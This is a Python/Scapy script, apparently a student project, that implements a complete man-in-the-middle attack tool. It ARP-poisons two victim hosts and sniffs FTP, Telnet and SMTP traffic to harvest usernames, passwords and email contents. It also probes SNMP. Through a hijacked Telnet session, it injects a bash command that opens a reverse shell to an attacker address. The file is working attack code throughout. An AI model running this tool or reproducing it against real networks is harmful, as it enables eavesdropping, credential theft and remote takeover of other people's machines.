from scapy.all import *
import sys
import os
import asn1
from logging import getLogger, ERROR
getLogger('scapy.runtime').setLevel(ERROR)

print("\n\n    -------------------WELCOME TO SCAPY AS MITM---------------------")
print("     ----------------------Ritz & TheGX 2020----------------------\n\n")
print("   Before: \n")
print("         ____________                        ____________")
print("        |  victim 1  |--------------------->|  victim 2  |")
print("         ____________ <--------------------- ____________\n")
print("   After: \n")
print("         ____________              _______             ____________")
print("        |  victim 1  |----------->|  you  |---------->|  victim 2  |")
print("         ____________ <----------- _______ <---------- ____________\n")

previousContent=0
possibleClientMAC=0
possibleServerMAC=0

seeMail=0

victimsIdentified = False
ScapyMAC = 'fe:14:d6:99:09:0d'

incomingUser = False
LaunchedAttacks = False
announceCredentials = False
incomingPassword = False
telnetConnectionEstablished = False
clientTelnetName = ''
userTelnet = ''
passwordTelnet = ''

usersFTP=['']
passwordsFTP=['']

def getMAC(IP, interface):

    conf.verb=0
    ans, unans = srp(Ether( dst= "ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=10, iface=interface, inter=0.1) 
    # Possible other methods:
    ## Retrive answers:
    # ans.summary(lambda s,r: r.sprintf("%Ether.src% %ARP.psrc%"))
    ## OR EVEN BETTER, replace entire thing with scapy built-in:
    # arping("192.168.1.*")
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

# ARP spoffing/cache poisoning
def doTheMess(victim_1ip, victim_2ip, victim1Mac, victim2Mac):

    send(ARP(op=2, pdst=victim_1ip, psrc= victim_2ip, hwdst= victim1Mac)) #op=2 because it's a reply
    send(ARP(op=2, pdst=victim_2ip, psrc= victim_1ip, hwdst= victim2Mac))


def cleanMess(victim_1ip, victim_2ip, interface):

    print("\nCleaning...\n")
    victim1Mac=getMAC(victim_1ip, interface)
    victim2Mac=getMAC(victim_2ip, interface)

    send(ARP(op=2 , pdst= victim_2ip, psrc=victim_1ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim1Mac), count=7)
    send(ARP(op=2 , pdst= victim_1ip, psrc=victim_2ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim2Mac), count=7)

    try:
        os_type = input("\nIf you use linux type 1, if you use macos type 0\n")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme type of os")
        sys.exit(1)

    print("Disabling ip forwarding...\n")

    if(os_type=='0'): os.system("sudo sysctl -w net.inet.ip.forwarding=0")
    else: 
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        os.system("echo 1 > /proc/sys/net/ipv4/conf/all/send_redirects")


    print("Bye!")
    sys.exit(1)


def checkLogin(packet, user, password):
    try:

        if "230" in packet[Raw].load.decode('ascii'): #230 it's the code for a valid login 
            print ("\nFound successful login! : ")
            print ("\n" + str(packet[IP].dst).strip() + " sent to " + str(packet[IP].src).strip() + ":")
            print ("Username: " + user+"\n")
            print ("Password: " + password + "\n")
            return
        else:
            return
    except Exception:
        return  


def checkFTPPacket(packet):

    if(packet.haslayer(Raw)):

        data=packet[Raw].load
        data=data.decode('ascii')
    
        if "USER " in data:
            #print("found ftp user packet\n")
            usersFTP.append(data.split("USER ")[1].strip())
        elif "PASS " in data:
            #print("found ftp pass packet\n")
            passwordsFTP.append(data.split("PASS ")[1].strip())
        else:
            #print("found ftp check packet\n")
            checkLogin(packet, usersFTP[-1], passwordsFTP[-1]) #checks if previously user and pass stored is a valid login
    return


def FTPSniffer(interface, victim1Ip, victim2Ip):

    print("Starting FTP Sniffer...\n")

    try:
        #ftp uses 21 port for connection and 20 for data
        sniff(iface=interface, prn=checkFTPPacket, store=0, filter="ether dst " + ScapyMAC +"and tcp src port 21 or tcp dst port 21") #prn specifies the function to apply to a received packet and store=0 to discard them 
    except KeyboardInterrupt:
        print("Failed to init FTP sniffing. Cleaning MESS\n")
        cleanMess(victim1Ip, victim2Ip,interface)
        sys.exit(1)

    print("\nStopped FTP Sniffer....\n")
    return

def SNMPAttack():

    print("\nLet's try to get system info using snmp...\n")

    cstring=input("type community string: ") #because everthing is in asn1 :')
    ipdst=input("type ip dst: ")

    ans=sr1(IP(dst=ipdst)/UDP(dport=161)/SNMP(community=cstring,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1.0"))])))
    print(ans.show())

def checkSNMPPacket(packet):

    print("Ip dst: "+packet[IP].dst )
    print("Community string: ")
    packet[SNMP].community.show()
    print("OID: ")
    packet[SNMPvarbind].oid.show()
    print("OID value: ")
    packet[SNMPvarbind].value.show()

    print("\n Type ctr-c to do more than sniffing")
    return


def SNMPSniffer(interface,victim1Ip, victim2Ip):

    print("Starting SNMP Sniffer...\n")

    try:
       
        sniff(iface=interface,prn=checkSNMPPacket, store=0,filter="ether dst " + ScapyMAC +"and udp src port 161 or udp dst port 161") #prn specifies the function to apply to a received packet and store=0 to discard them
        SNMPAttack()
    except KeyboardInterrupt:
        print("Failed to init SNMP sniffing. Cleaning MESS\n")
        cleanMess(victim1Ip, victim2Ip,interface)
        sys.exit(1)

    return

def TelnetIdentify(packet, currentContent):
    
    global previousContent
    global possibleClientMAC 
    global possibleServerMAC 
    global victimsIdentified 
    
    if(previousContent == currentContent):
        if(possibleServerMAC == packet[Ether].src):
            victimsIdentified = True
            print('Telnet server and Client identified\n')
            print('ServerMAC: ' + possibleServerMAC)
            print('\nClientMAC: ' + possibleClientMAC + "\n")
            return
        possibleServerMAC = packet[Ether].src
    previousContent = currentContent
    possibleClientMAC = packet[Ether].src

def checkTelnetPacket(packet):

    global possibleServerMAC 
    global victimsIdentified 
    
    global incomingUser 
    global incomingPassword 
    global userTelnet
    global passwordTelnet
    global clientTelnetName
    global telnetConnectionEstablished 
    global announceCredentials 
    
    if(packet.haslayer(Raw)): 
        #print('Ether.src: ' + packet[Ether].src)
        #print('Ether.dst: ' + packet[Ether].dst)
        #packet.show()
        currentContent = packet[Raw].load.decode('ISO-8859-1')
    
        if(telnetConnectionEstablished):
            
            packet[Raw].show()
            # Scapy got in the middle before User logged in
            if(victimsIdentified):
               
                if( userTelnet != '' and passwordTelnet != '' 
                    and not announceCredentials ):
                    announceCredentials = True
                    print('Detected Credencials:')
                    print('User: ' + userTelnet)
                    print('Pass: ' + passwordTelnet)
                
                TCPHijack(packet, possibleServerMAC, currentContent)
                return
            
            # Connection was already established so try to identify MACs.
            else:
                TelnetIdentify(packet, currentContent)
                return
    
        else: 
            
            if(('@' + clientTelnetName) in currentContent):
                print('User logged in!\n')
                telnetConnectionEstablished = True
                    
                return

            elif('login:' in currentContent and clientTelnetName == ''):
                print('-----------------\n')
                clientTelnetName = currentContent.split(" login")[0]
                print('clientTelnetName ' + clientTelnetName + '\n')
                incomingUser = True
                
                #By consequence, victims also get immediatly identified
                victimsIdentified = True
                
                possibleServerMAC = packet[Ether].src
                print('Telnet server identified\n')
                print('ServerMAC: ' + possibleServerMAC)
                return
            
            #Analyse Clinet packets for User input ()
            elif(packet[Ether].src == possibleServerMAC and incomingUser):

                possibleClientMAC = packet[Ether].src
                #Enter was pressed after Login
                if( ('\r\n' in currentContent) or 
                    ('\r\x00' in currentContent) ):
                    print('ENTIRE USER: ' + userTelnet)
                    incomingUser = False
                else: 
                    userTelnet += currentContent
                    print('Current USER: ' + userTelnet)
                return
            
            elif(packet[Ether].src == possibleServerMAC and 
                'Password:' in currentContent):
                incomingPassword = True
                print('PASSWORD INCOMING!')
            
            elif(packet[Ether].src != possibleServerMAC and incomingPassword):
                
                #Enter was pressed after Password
                if('\r\n' in currentContent or 
                    '\r\x00' in currentContent):
                    incomingPassword = False
                    print('ENTIRE PASSWORD: ' + passwordTelnet)

                elif(currentContent == '\x7f'):
                    passwordTelnet = passwordTelnet[:-1] 
                
                else:
                    passwordTelnet += currentContent
                
                print('Current PASSWORD: ' + passwordTelnet)
                return

def CheckLaunchedAttacks(x):
    
    global LaunchedAttacks
    return LaunchedAttacks

def TelnetSniffer(interface, victim1Ip, victim2Ip):
    
    print("Starting Telnet Sniffer...\n")
    
    try:
        sniff(iface=interface, 
                prn = checkTelnetPacket,
                filter="ether dst " + ScapyMAC + "and (tcp src port telnet or tcp dst port telnet)", 
                stop_filter = CheckLaunchedAttacks)
        #prn specifies the function to apply to a received packet and store=0 to discard them
    except KeyboardInterrupt:
        print("Failed to init Telnet sniffing. Cleaning MESS\n")
        cleanMess(victim1Ip, victim2Ip,interface)
        sys.exit(1)

    return

def checkSMTPPacket(packet):

    global seeMail
    
    if(packet.haslayer(Raw) and seeMail ==0):

        data=packet[Raw].load.decode('ascii')
        if("MAIL FROM:" in data):
            print("User trying to send email:"+ data.split("MAIL FROM: ")[1].strip())
        if("RCPT TO:" in data):
            print("User trying to send email to:"+ data.split("RCPT TO: ")[1].strip())
        if("354" in data): #aka starting email input
            seeMail=1
         
    if(packet.haslayer(Raw) and seeMail ==1):

        data=packet[Raw].load.decode('ascii')
        if( "354" not in data and "250" not in data):
            print ("Email body: "+data)
        if( "250 2.0.0 Ok: "in data):
            print("The previous mail was successfully queued") 
            seeMail=0   
    return
        


def SMTPSniffer(interface, victim1Ip, victim2Ip):
    
    print("Starting SMTP Sniffer...\n")

    try:
       
        sniff(iface=interface,prn=checkSMTPPacket, store=0,
                filter="ether dst " + ScapyMAC + "and (tcp src port 25 or tcp dst port 25)") 
        #prn specifies the function to apply to a received packet and store=0 to discard them
    except KeyboardInterrupt:
        print("Failed to init SMTP sniffing. Cleaning MESS\n")
        cleanMess(victim1Ip, victim2Ip,interface)
        sys.exit(1)

    return
    

def chooseAttack(interface, victim1Ip, victim2Ip):

    print("Which type of communication you want to sniff? (and maybe do more...)\n")


    try:
        typeOfAttack=input("\nPress 1 for FTP, 2 for SNMP, 3 for Telnet and 4 for SMTP \n")
        
        if(typeOfAttack=='1'):
            FTPSniffer(interface, victim1Ip, victim2Ip)
        if(typeOfAttack=='2'):
            SNMPSniffer(interface, victim1Ip, victim2Ip)
        if(typeOfAttack=='3'):
            TelnetSniffer(interface, victim1Ip, victim2Ip)
        if(typeOfAttack=='4'):
            SMTPSniffer(interface, victim1Ip, victim2Ip)

    except KeyboardInterrupt:
        print("Stop typing random commands and gimme number\n")
        cleanMess(victim1Ip, victim2Ip, interface)
        sys.exit(1)

def ReverseShell(packet):
    #Bash reverse: /bin/bash -i >& /dev/tcp/192.168.109.138/1337 0>&1
    #Here: ncat -l -p 1337

    print("-----------------")
    print("SCAPY TO SERVER")

    packetdata = {
       'Ethersrc': packet[Ether].src,
       'Etherdst': packet[Ether].dst,
       'src': packet[IP].src,
       'dst': packet[IP].dst,
       'sport': packet[TCP].sport,
       'dport': packet[TCP].dport,
       'seq': packet[TCP].seq,
       'ack': packet[TCP].ack
    }

    del packet[IP].len
    del packet[IP].chksum
    del packet[TCP].chksum
    
    packet[Ether].dst = packetdata['Ethersrc']
    packet[Ether].src = packetdata['Etherdst']
    
    packet[IP].dst = packetdata['src']
    packet[IP].src = packetdata['dst']

    packet[TCP].dport = packetdata['sport']
    packet[TCP].sport = packetdata['dport']
    packet[TCP].flags = "AP"
    
    packet[TCP].seq=packetdata['ack']
    packet[TCP].ack=packetdata['seq']
    packet[TCP].remove_payload()
    
    packet = packet/Raw(load='/bin/bash -i >& /dev/tcp/192.168.109.138/1337 0>&1\r\x00')
    
    print('SENT REVERSE SHELL!')
    sendp(packet)
    RSTSend(packet)

def RSTSend(packet):
   
    packet[TCP].flags="R"
    packet[TCP].seq += len(packet[TCP].payload)
    packet[TCP].remove_payload()

    return 

def TCPHijack(packet, possibleServerMAC, currentContent):
    
    global LaunchedAttacks
    #Packets coming from server to client
    if(packet[Ether].src == possibleServerMAC):
        
        if(currentContent == '\r\n'):
            if( not LaunchedAttacks):
                ReverseShell(packet)
                LaunchedAttacks = True
    return 

def MITM():

    #we start by ping broadcasting our entire LAN to fill the arp table
    #so we can know the IP and MAC address of all hosts
    try:
        IpBroadcast= input("Type the broadcast IP: ") # TODO: automatic
        interface = input("Type the interface name: ")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme IP broadcast")
        sys.exit(1)
        

    ping_command = "ping -b {} -c 10".format(IpBroadcast)
    os.system(ping_command)

    os.system("sleep 10")
    print("\n\n\nAvailable hosts: \n")

    arp_command = "arp -i {} -a".format(interface)
    os.system(arp_command)
    # getting info victim
    #victim_1ip="192.168.109.122"
    #victim_2ip="192.168.109.147"

    try:
        victim_1ip= input("\nType victim 1 IP:")
        victim_2ip= input("\nType victim 2 IP:")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme victims'ip")
        sys.exit(1)

    victim1Mac=getMAC(victim_1ip, interface)
    victim2Mac=getMAC(victim_2ip, interface)
    #allowing ip forwarding to maintain communication between victims 

    try:
        os_type = input("\nIf you use linux type 1, if you use macos type 0\n")
    except KeyboardInterrupt:
        print("\n\nStop typing random commands and gimme type of os")
        sys.exit(1)

    print("\nEnabling ip forwarding...\n")

    if(os_type=='0'): os.system("sudo sysctl -w net.inet.ip.forwarding=1")
    else: 
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        os.system("echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects")


    print("\nDoing the mess...\n")

    doTheMess(victim_1ip, victim_2ip,victim1Mac, victim2Mac)

    chooseAttack(interface, victim_1ip, victim_2ip)
   
  
    try:
        input("\nType control-c to escape\n")
    except KeyboardInterrupt:
        cleanMess(victim_1ip, victim_2ip, interface)
        pass
            

MITM()
